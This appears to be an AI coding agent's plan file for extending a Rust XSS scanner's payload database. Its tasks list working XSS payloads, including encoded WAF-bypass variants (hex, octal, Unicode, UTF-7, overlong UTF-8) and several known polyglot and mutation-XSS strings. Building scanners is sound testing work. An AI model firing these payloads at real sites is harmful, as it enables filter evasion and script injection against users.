---
phase: 01-payload-foundation
plan: 01
type: execute
wave: 1
depends_on: []
files_modified:
  - src/payloads_comprehensive.rs
autonomous: true

must_haves:
  truths:
    - "Payload database includes hex-encoded XSS payloads (\\xNN format)"
    - "Payload database includes octal-encoded XSS payloads (\\NNN format)"
    - "Payload database includes Unicode-encoded XSS payloads (\\uNNNN format)"
    - "Payload database includes UTF-7 encoded XSS payloads (+ADw- format)"
    - "Payload database includes 5+ polyglot payloads that work across HTML, JS, and attribute contexts"
  artifacts:
    - path: "src/payloads_comprehensive.rs"
      provides: "XSS encoding bypass and polyglot payload generators"
      contains: "generate_advanced_encoding_bypass_xss"
      min_lines: 2300
  key_links:
    - from: "src/payloads_comprehensive.rs"
      to: "get_all_xss_payloads()"
      via: "aggregator function call"
      pattern: "generate_advanced_encoding_bypass_xss\\(\\)"
---

<objective>
Add comprehensive XSS encoding variations and polyglot payloads to the payload database.

Purpose: Enable detection of XSS vulnerabilities that use encoding-based WAF bypasses (hex, octal, Unicode, UTF-7) and payloads that work across multiple HTML/JS contexts.

Output: Extended payloads_comprehensive.rs with new generator functions and updated aggregator.
</objective>

<execution_context>
@C:\Users\whips\.claude/get-shit-done/workflows/execute-plan.md
@C:\Users\whips\.claude/get-shit-done/templates/summary.md
</execution_context>

<context>
@.planning/PROJECT.md
@.planning/ROADMAP.md
@.planning/STATE.md
@.planning/phases/01-payload-foundation/01-RESEARCH.md
@src/payloads_comprehensive.rs
</context>

<tasks>

<task type="auto">
  <name>Task 1: Add advanced XSS encoding bypass payloads</name>
  <files>src/payloads_comprehensive.rs</files>
  <action>
Create a new function `generate_advanced_encoding_bypass_xss() -> Vec<String>` that generates XSS payloads with the following encoding schemes:

1. **Hex encoding** (`\xNN` format in JavaScript):
   - `<script>\x61\x6c\x65\x72\x74(1)</script>` (alert)
   - `<img src=x onerror=\x61\x6c\x65\x72\x74(1)>`
   - `<svg onload=\x61\x6c\x65\x72\x74(1)>`
   - Also encode full function names and arguments

2. **Octal encoding** (`\NNN` format):
   - `<script>\141\154\145\162\164(1)</script>` (alert in octal)
   - `javascript:'\74\163\166\147...'` (SVG in octal)
   - Cover common XSS vectors

3. **Unicode escapes** (`\uNNNN` format):
   - `<script>\u0061\u006c\u0065\u0072\u0074(1)</script>`
   - `<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>`
   - Full-width Unicode bypass: `<\uFF1Cscript\uFF1E>alert(1)</script>`

4. **UTF-7 encoding** (for legacy charset attacks):
   - `+ADw-script+AD4-alert(1)+ADw-/script+AD4-`
   - `+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-`

5. **UTF-8 overlong sequences** (WAF bypass):
   - `<%C0%BCscript>alert(1)</script>` (< as overlong UTF-8)
   - `<%E0%80%BCscript>alert(1)</script>`
   - `<%F0%80%80%BCscript>alert(1)</script>`

6. **Mixed/nested encodings**:
   - `eval(String.fromCharCode(97,108,101,114,116,40,49,41))`
   - Double URL encode: `%253Cscript%253Ealert(1)%253C/script%253E`

Generate at least 50 payloads covering all encoding types. Follow the existing pattern:
```rust
pub fn generate_advanced_encoding_bypass_xss() -> Vec<String> {
    let mut payloads = Vec::new();
    // ... payload generation
    payloads
}
```

Place this function after `generate_modern_waf_bypass_xss()` (around line 1025).
  </action>
  <verify>
Run `cargo check` to verify syntax is correct. Grep for the new function name to confirm it exists.
  </verify>
  <done>
Function `generate_advanced_encoding_bypass_xss()` exists and returns 50+ payloads with hex, octal, Unicode, UTF-7, overlong UTF-8, and mixed encodings.
  </done>
</task>

<task type="auto">
  <name>Task 2: Add polyglot XSS payloads</name>
  <files>src/payloads_comprehensive.rs</files>
  <action>
Create a new function `generate_advanced_polyglot_xss() -> Vec<String>` that generates polyglot payloads working across multiple contexts. These payloads should fire in HTML body, attribute, JavaScript string, and URL contexts.

Include these specific polyglots from research:

1. **0xsobky Ultimate Polyglot** (JS, HTML event, SVG, URL):
   ```
   jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
   ```

2. **Mathias Karlsson Polyglot** (attribute/event/comment):
   ```
   " onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//
   ```

3. **Multi-context string polyglot** (single/double quote JS strings):
   ```
   ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";...
   ```

4. **HTML/JS/URL polyglot**:
   ```
   JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/...
   ```

5. **Comment breakout polyglot**:
   ```
   -->'"/></sCript><svG x=">" onload=(co\u006efirm)``>
   ```

6. **Template literal polyglot** (ES6):
   ```
   `${alert(1)}`
   ```

7. **Mutation XSS polyglot**:
   ```
   <form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>
   ```

Add at least 10 polyglot payloads. Place after `generate_advanced_encoding_bypass_xss()`.

Update the existing `generate_polyglot_xss()` function OR create the new function - ensure the total is 15+ polyglots (existing has ~13, add 5+ more unique ones).
  </action>
  <verify>
Run `cargo check`. Count polyglot payloads to confirm 15+ total between existing and new functions.
  </verify>
  <done>
Polyglot XSS payload count is 15+ covering HTML body, attribute, JS string, URL, and template literal contexts.
  </done>
</task>

<task type="auto">
  <name>Task 3: Wire new XSS generators into aggregator</name>
  <files>src/payloads_comprehensive.rs</files>
  <action>
Update the `get_all_xss_payloads()` function to include the new generator(s):

```rust
pub fn get_all_xss_payloads() -> Vec<String> {
    let mut all_payloads = Vec::new();

    all_payloads.extend(generate_script_variations()); // 20,000+
    all_payloads.extend(generate_event_variations()); // 40,000+
    all_payloads.extend(generate_encoding_variations()); // 20,000+
    all_payloads.extend(generate_waf_bypass()); // 10,000+
    all_payloads.extend(generate_protocol_variations()); // 5,000+
    all_payloads.extend(generate_dom_variations()); // 5,000+
    all_payloads.extend(generate_polyglot_xss()); // 100+
    all_payloads.extend(generate_svg_xss()); // 200+
    all_payloads.extend(generate_mutation_xss()); // 100+
    all_payloads.extend(generate_context_aware_xss()); // 300+
    all_payloads.extend(generate_modern_waf_bypass_xss()); // 200+
    all_payloads.extend(generate_modern_xss_2024_2025()); // 10,000+
    all_payloads.extend(generate_advanced_encoding_bypass_xss()); // NEW: 50+
    all_payloads.extend(generate_advanced_polyglot_xss()); // NEW: 10+ (if created as separate function)

    all_payloads
}
```

Add the new function calls after existing ones. Update comments to indicate payload counts.

Run compilation test to ensure everything links correctly.
  </action>
  <verify>
Run `cargo build --release` to verify full compilation succeeds. The build should complete without errors.
  </verify>
  <done>
`cargo build --release` succeeds. `get_all_xss_payloads()` calls new generator functions.
  </done>
</task>

</tasks>

<verification>
1. `cargo build --release` completes successfully
2. `grep -c "generate_advanced_encoding_bypass_xss" src/payloads_comprehensive.rs` returns at least 2 (definition + call)
3. `cargo test` passes (if tests exist for payloads)
</verification>

<success_criteria>
- PAY-01 satisfied: Hex, octal, Unicode, UTF-7 encoding variations exist
- PAY-02 satisfied: 5+ polyglot payloads that work across HTML/JS/attribute contexts
- Code compiles and integrates with existing payload system
</success_criteria>

<output>
After completion, create `.planning/phases/01-payload-foundation/01-01-SUMMARY.md`
</output>
